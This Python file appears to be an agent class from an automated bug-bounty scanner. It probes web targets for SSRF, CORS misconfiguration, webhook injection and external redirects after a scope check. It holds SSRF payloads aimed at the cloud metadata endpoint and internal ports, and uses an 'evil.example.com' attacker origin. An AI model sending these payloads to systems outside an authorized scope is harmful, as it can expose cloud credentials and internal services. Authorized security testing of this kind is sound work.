import httpx
from urllib.parse import urlparse, urljoin
from .base_agent import BaseTeamAgent, AgentState, _build_raw_finding, _utcnow
from ...core.models import AgentLoadOut
from ...tools.scope_checker import validate_scope, ScopeViolationError


class IntegrationScout(BaseTeamAgent):
    agent_id    = "IntegrationScout"
    model_alias = "MODEL_AGENT_STD"

    async def _execute_node(self, state: AgentState) -> dict:
        loadout   = AgentLoadOut(**state["loadout"])
        test_idx  = state.get("test_idx", 0)
        iteration = state.get("iteration", 0)
        scope_rules = state.get("scope_rules", {})

        if test_idx >= len(loadout.test_cases) or iteration >= loadout.max_iterations:
            return {"messages":[{"role":"system","content":"[IntegrationScout] done","agent":self.agent_id,"ts":_utcnow()}]}

        tc      = loadout.test_cases[test_idx]
        surface = tc.get("surface","")

        try:
            validate_scope(surface, scope_rules)
        except ScopeViolationError:
            return {"test_idx": test_idx+1, "iteration": iteration+1,
                    "messages":[{"role":"system","content":"[IntegrationScout] scope skip","agent":self.agent_id,"ts":_utcnow()}]}

        technique   = tc.get("technique","")
        tool_config = loadout.tool_configs.get(technique, {})

        result = await self._run_integration_technique(technique, surface, tool_config, tc, loadout)

        findings = list(state.get("local_findings", []))
        if result.get("confirmed") or result.get("output"):
            findings.append(_build_raw_finding(tc, result, self.agent_id))

        should_collab = len(findings) > 0 and iteration > 0 and iteration % 3 == 0

        return {
            "local_findings": findings,
            "test_idx":       test_idx + 1,
            "iteration":      iteration + 1,
            "_should_collaborate": should_collab,
            "messages":[{"role":"system","content":f"[IntegrationScout] {technique} → {'✓' if result.get('confirmed') else '·'}","agent":self.agent_id,"ts":_utcnow()}],
        }

    async def _run_integration_technique(self, technique: str, surface: str, config: dict, tc: dict, loadout: AgentLoadOut) -> dict:
        if technique in ("ssrf", "ssrf_check"):
            return await self._test_ssrf(surface, config)
        if technique in ("cors_check", "cors_misconfiguration"):
            return await self._test_cors(surface, config)
        if technique in ("webhook_injection",):
            return await self._test_webhook(surface, config)
        if technique in ("third_party_redirect", "external_redirect"):
            return await self._test_third_party_redirect(surface, config)
        return await self._llm_execute(tc, loadout, {})  # type: ignore

    async def _test_ssrf(self, url: str, config: dict) -> dict:
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080",
            "http://127.0.0.1:6379",
            "http://0.0.0.0:22",
            "http://internal.company.com",
        ]
        url_params = config.get("params", ["url", "redirect", "webhook", "callback", "target", "src", "dest"])
        try:
            async with httpx.AsyncClient(timeout=6, verify=False, follow_redirects=False) as client:
                for param in url_params[:3]:
                    for payload in ssrf_payloads[:2]:
                        resp = await client.get(
                            url, params={param: payload},
                            headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"}
                        )
                        if resp.status_code in (200, 500) and any(
                            kw in resp.text.lower() for kw in
                            ["ami-id", "instance-id", "ec2", "metadata", "local", "connection refused"]
                        ):
                            return {
                                "confirmed":   True,
                                "output":      f"SSRF: server fetched internal resource via {param}={payload}",
                                "description": f"Server-Side Request Forgery at {url} via parameter '{param}'",
                                "request":     {"url": url, "param": param, "payload": payload},
                                "response_diff": {"ssrf_indicator": True},
                                "payload":     f"{param}={payload}",
                                "reproduction_steps": [
                                    f"1. GET {url}?{param}={payload}",
                                    "2. Observe internal resource content in response",
                                    "3. SSRF confirmed — internal network access possible",
                                ],
                            }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}

    async def _test_cors(self, url: str, config: dict) -> dict:
        evil_origin = "https://evil.example.com"
        try:
            async with httpx.AsyncClient(timeout=8, verify=False) as client:
                resp = await client.get(url, headers={
                    "User-Agent": "Mozilla/5.0 BountyMind/4.0",
                    "Origin":     evil_origin,
                })
                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "")

                if acao == "*":
                    return {
                        "confirmed":   True,
                        "output":      f"CORS wildcard: Access-Control-Allow-Origin: *",
                        "description": f"CORS misconfiguration at {url}: wildcard origin allows any domain",
                        "request":     {"url": url, "origin": evil_origin},
                        "response_diff": {"ACAO": "*"},
                        "payload":     "",
                        "reproduction_steps": [
                            f"1. Send request to {url} with Origin: {evil_origin}",
                            "2. Observe Access-Control-Allow-Origin: *",
                            "3. Cross-origin requests from any domain are permitted",
                        ],
                    }
                if evil_origin in acao and "true" in acac.lower():
                    return {
                        "confirmed":   True,
                        "output":      f"CORS: attacker origin reflected with credentials=true",
                        "description": f"Critical CORS misconfiguration at {url}: attacker origin + credentials allowed",
                        "request":     {"url": url, "origin": evil_origin},
                        "response_diff": {"ACAO": acao, "ACAC": acac},
                        "payload":     f"Origin: {evil_origin}",
                        "reproduction_steps": [
                            f"1. Send credentialed request to {url} with Origin: {evil_origin}",
                            f"2. Observe ACAO: {evil_origin} + ACAC: true",
                            "3. Cross-origin cookie theft possible",
                        ],
                    }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}

    async def _test_webhook(self, url: str, config: dict) -> dict:
        ssrf_url = "http://169.254.169.254/latest/meta-data/"
        try:
            async with httpx.AsyncClient(timeout=6, verify=False) as client:
                resp = await client.post(url,
                    json={"webhook_url": ssrf_url, "url": ssrf_url, "callback": ssrf_url},
                    headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0",
                             "Content-Type": "application/json"},
                )
                if resp.status_code in (200, 201) and any(
                    kw in resp.text.lower() for kw in ["fetching", "success", "delivered", "sent"]
                ):
                    return {
                        "confirmed":   True,
                        "output":      f"Webhook injection: server may have fetched {ssrf_url}",
                        "description": f"SSRF via webhook at {url}",
                        "request":     {"url": url, "payload": {"webhook_url": ssrf_url}},
                        "response_diff": {"webhook_triggered": True},
                        "payload":     str({"webhook_url": ssrf_url}),
                        "reproduction_steps": [
                            f"1. POST {url} with webhook_url pointing to internal resource",
                            "2. Server fetches the URL server-side",
                            "3. SSRF via webhook confirmed",
                        ],
                    }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}

    async def _test_third_party_redirect(self, url: str, config: dict) -> dict:
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False) as client:
                resp = await client.get(url,
                                        headers={"User-Agent": "Mozilla/5.0 BountyMind/4.0"})
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("location", "")
                    parsed   = urlparse(location)
                    base     = urlparse(url)
                    if parsed.netloc and parsed.netloc != base.netloc:
                        return {
                            "confirmed":   True,
                            "output":      f"External redirect to {parsed.netloc}",
                            "description": f"Third-party redirect at {url} → {location}",
                            "request":     {"url": url},
                            "response_diff": {"location": location, "external_domain": parsed.netloc},
                            "payload":     "",
                            "reproduction_steps": [
                                f"1. Navigate to {url}",
                                f"2. Observe redirect to external domain: {parsed.netloc}",
                                "3. Evaluate for phishing or open redirect abuse",
                            ],
                        }
        except Exception:
            pass
        return {"confirmed": False, "output": ""}
